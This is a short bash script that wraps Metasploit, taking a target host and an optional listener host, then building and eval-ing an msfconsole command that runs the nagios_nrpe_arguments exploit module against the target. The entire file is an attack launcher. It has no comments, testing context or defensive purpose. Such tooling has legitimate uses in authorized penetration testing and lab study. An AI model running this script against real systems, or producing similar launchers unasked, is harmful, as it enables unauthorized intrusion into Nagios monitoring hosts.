#!/bin/bash

function usage() {
    echo "Usage: "$0" <rhost> [<lhost>]"
    if [ -n "$1" ] ; then
	echo "Error: "$1"!"
    fi
    exit
}

if [ $# -lt 1 ] || [ $# -gt 2 ] ; then
    usage
fi

rhost=$1

if [ $# -eq 2 ] ; then
	lhost=$2
else
	lhost=""
fi

exploit=""
rhost="set rhost $rhost"

cmd="msfconsole -q -x \"use exploit/linux/misc/nagios_nrpe_arguments; $rhost"
if ! [ "$lhost" == "" ] ; then
	cmd="$cmd; set lhost $lhost"
fi
cmd="$cmd; run; exit;\""
echo $cmd

eval $cmd

exit;
